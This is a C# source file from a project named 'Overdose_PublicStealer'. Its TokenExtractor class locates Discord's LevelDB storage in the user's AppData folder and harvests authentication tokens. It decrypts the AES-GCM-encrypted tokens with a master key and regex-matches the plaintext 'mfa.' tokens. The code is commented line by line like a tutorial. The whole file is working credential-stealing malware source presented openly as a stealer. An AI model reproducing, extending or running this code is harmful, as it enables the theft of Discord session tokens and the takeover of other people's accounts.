using System;
using System.Collections.Generic;
using System.IO; // Used for file and directory operations (Path, Directory, File)
using System.Linq; // Used for LINQ methods like .Distinct(), .ToList()
using System.Text.RegularExpressions; // Used for finding token patterns with Regex

// NOTE: This code snippet is part of a larger project.
// It depends on other classes/methods not shown here:
// - MasterKeyHelper.GetMasterKey() to get the Discord encryption key.
// - AesGcmHelper.DecryptToken() to decrypt AES-GCM encrypted tokens.
// - Implicitly relies on DPAPI and BouncyCastle for decryption.

namespace Overdose_PublicStealer
{
    // This static class is responsible for locating and extracting Discord tokens.
    internal static class TokenExtractor
    {
        /// <summary>
        /// Attempts to retrieve Discord tokens from the default installation path.
        /// Searches for both AES-GCM encrypted tokens and plain text MFA tokens.
        /// </summary>
        /// <returns>A distinct list of found tokens, or an empty list if none are found or extraction fails.</returns>
        internal static List<string> GetTokens()
        {
            // List to store the extracted tokens.
            List<string> tokens = new List<string>();

            // Attempt to retrieve the Discord encryption master key.
            // This key is needed to decrypt the primary token format (AES-GCM).
            byte[] masterKey = MasterKeyHelper.GetMasterKey();

            // If the master key could not be retrieved, we cannot decrypt AES-GCM tokens.
            // Return the empty list as no tokens can be reliably obtained.
            if (masterKey == null)
                return tokens; // Return empty list if master key is not found

            // Construct the typical path to Discord's LevelDB storage.
            // Tokens are stored in LevelDB files within the Local Storage directory.
            string discordPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
                "AppData", "Roaming", "discord", "Local Storage", "leveldb");

            // Check if the Discord LevelDB directory exists.
            // If it doesn't, Discord is likely not installed in the default location,
            // or the path structure has changed. Return the empty list.
            if (!Directory.Exists(discordPath))
                return tokens; // Return empty list if directory doesn't exist

            // Iterate through all files with the .ldb extension in the LevelDB directory.
            // These files contain key-value pairs, including potentially tokens.
            foreach (var file in Directory.GetFiles(discordPath, "*.ldb"))
            {
                try
                {
                    // Read the entire content of the .ldb file as text.
                    // Tokens are usually stored as strings within these files.
                    string content = File.ReadAllText(file);

                    // --- Search for AES-GCM Encrypted Tokens ---
                    // These tokens start with "dQw4w9WgXcQ:" followed by a Base64 encoded string.
                    // The Base64 string contains the encrypted token, nonce, and auth tag.
                    foreach (Match m in Regex.Matches(content, @"dQw4w9WgXcQ:[^\\""]+"))
                    {
                        // Extract the Base64 part of the matched string by splitting on ':' and trimming quotes.
                        string base64 = m.Value.Split(':')[1].Trim('"');

                        // Attempt to decrypt the Base64 string using the retrieved master key.
                        // The AesGcmHelper handles the AES-GCM decryption process.
                        string decrypted = AesGcmHelper.DecryptToken(base64, masterKey);

                        // If decryption was successful and returned a non-empty string, add it to the list.
                        if (!string.IsNullOrEmpty(decrypted))
                            tokens.Add(decrypted);
                    }

                    // --- Search for Plain Text MFA Tokens ---
                    // These tokens are typically used for Multi-Factor Authentication
                    // and often appear in plain text, matching the pattern "mfa." followed by characters.
                    foreach (Match m in Regex.Matches(content, @"mfa\.[\w-]{84}"))
                    {
                        // Found a plain text MFA token. Add it directly to the list.
                        tokens.Add(m.Value);
                    }
                }
                catch (Exception ex)
                {
                    // Catch any errors that occur while reading or processing a specific file (e.g., file in use).
                    // Log the error and continue processing other files.
                    Console.WriteLine($"Error reading file {file}: {ex.Message}");
                }
            }

            // Return a list containing only unique tokens found across all processed files.
            // .Distinct() removes duplicates. .ToList() converts the result back to a List<string>.
            return tokens.Distinct().ToList();
        }
    }
}